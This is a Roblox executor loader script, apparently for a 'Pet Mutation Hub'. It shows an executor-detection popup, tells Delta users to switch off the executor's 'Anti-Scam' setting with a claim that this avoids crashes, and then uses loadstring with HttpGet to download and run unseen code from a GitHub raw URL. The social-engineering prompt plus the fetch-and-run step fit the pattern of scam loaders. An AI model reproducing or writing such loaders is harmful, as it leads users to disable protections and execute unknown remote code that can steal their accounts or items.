--// Services
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")

--// Executor Detection
local executor = identifyexecutor and identifyexecutor() or "Unknown"
local isDelta = string.lower(executor) == "delta"

--// Utility function: GUI with fade-in
local function createGui(name, size, titleText, infoText, showCountdown, countdownSeconds)
    local gui = Instance.new("ScreenGui", CoreGui)
    gui.Name = name
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true

    local frame = Instance.new("Frame")
    frame.Size = size
    frame.Position = UDim2.new(0.5, 0, 0.5, 0)
    frame.AnchorPoint = Vector2.new(0.5, 0.5)
    frame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    frame.BorderSizePixel = 0
    frame.Parent = gui

    local corner = Instance.new("UICorner", frame)
    corner.CornerRadius = UDim.new(0, 12)

    local shadow = Instance.new("ImageLabel", frame)
    shadow.AnchorPoint = Vector2.new(0.5, 0.5)
    shadow.Position = UDim2.new(0.5, 4, 0.5, 4)
    shadow.Size = UDim2.new(1, 30, 1, 30)
    shadow.BackgroundTransparency = 1
    shadow.Image = "rbxassetid://1316045217"
    shadow.ImageTransparency = 0.6
    shadow.ZIndex = 0
    shadow.Parent = frame

    local title = Instance.new("TextLabel", frame)
    title.Size = UDim2.new(1, -20, 0, 40)
    title.Position = UDim2.new(0, 10, 0, 15)
    title.BackgroundTransparency = 1
    title.Text = titleText
    title.TextColor3 = Color3.fromRGB(180, 240, 255)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 22
    title.TextWrapped = true
    title.TextTransparency = 0
    title.Parent = frame

    local info = Instance.new("TextLabel", frame)
    info.Size = UDim2.new(1, -20, 0, 100)
    info.Position = UDim2.new(0, 10, 0, 60)
    info.BackgroundTransparency = 1
    info.Text = infoText
    info.TextWrapped = true
    info.TextColor3 = Color3.fromRGB(255, 255, 255)
    info.Font = Enum.Font.Gotham
    info.TextSize = 18
    info.TextTransparency = 0
    info.TextYAlignment = Enum.TextYAlignment.Top
    info.Parent = frame

    local countdownLabel
    if showCountdown then
        countdownLabel = Instance.new("TextLabel", frame)
        countdownLabel.Size = UDim2.new(1, -20, 0, 30)
        countdownLabel.Position = UDim2.new(0, 10, 1, -40)
        countdownLabel.BackgroundTransparency = 1
        countdownLabel.TextColor3 = Color3.fromRGB(200, 255, 200)
        countdownLabel.Font = Enum.Font.GothamBold
        countdownLabel.TextSize = 18
        countdownLabel.Text = "Starting in " .. countdownSeconds .. "..."
        countdownLabel.TextTransparency = 0
    end

    return gui, countdownLabel
end

--// FIRST GUI: Detecting Executor
local gui1, _ = createGui("ExecutorDetectGUI", UDim2.new(0, 450, 0, 180), "🔍 Detecting your executor...", "Please wait while we check your environment...", false, 0)

-- Wait 2 seconds then show second GUI based on executor
task.delay(2, function()
    gui1:Destroy()

    if isDelta then
        -- DELTA GUI
        local gui2, _ = createGui("DeltaWarning", UDim2.new(0, 480, 0, 220),
            "⚠️ Delta Executor Detected",
            "Please open your Delta settings and turn OFF the 'Anti-Scam' option to avoid crashes.\n\n✅ If you've done it, wait 3 seconds and the script will load automatically.",
            false, 0
        )

        task.delay(10, function()
            gui2:Destroy()
            -- Load main script
            loadstring(game:HttpGet("https://raw.githubusercontent.com/GaGPS/MutationRandomizer/refs/heads/main/PetMutationHubV1.2.lua"))()
        end)

    else
        -- OTHER EXECUTORS GUI
        local gui3, countdownLabel = createGui("ExecutorOK", UDim2.new(0, 450, 0, 180),
            "✅ Executor Detected: "..executor,
            "You're good to go! The script will start shortly.",
            true, 5
        )

        local timeLeft = 5
        while timeLeft > 0 do
            countdownLabel.Text = "Starting in " .. timeLeft .. "..."
            task.wait(1)
            timeLeft -= 1
        end

        gui3:Destroy()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GaGPS/MutationRandomizer/refs/heads/main/PetMutationHubV1.2.lua"))()
    end
end)